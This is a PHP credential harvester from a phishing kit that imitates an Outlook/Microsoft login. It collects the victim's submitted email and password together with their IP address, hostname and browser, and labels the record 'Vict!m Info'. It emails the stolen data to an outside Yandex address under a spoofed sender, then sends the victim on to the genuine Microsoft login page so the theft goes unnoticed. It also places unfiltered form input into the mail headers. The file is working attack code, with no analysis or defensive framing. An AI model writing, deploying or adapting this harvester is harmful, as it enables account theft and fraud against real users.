<?php
require ("sat.php");
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Online Info-----------------------\n";
$message .= "Emal ID:             : ".$_POST['gansdon']."\n";
$feel = $_POST['gansdon'];
$message .= "Password:             : ".$_POST['fllkisu']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY $PG Bon-------------\n";
$send = "email@yandex.com";
$subject = "PG Outlook $ip";
$headers = "From: My Outlook <shewill@eventmana.com>";
$headers .= $_POST['housefolna']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}


header("Location: http://login.microsoftonline.com?email=$feel&question_box=404");




?>
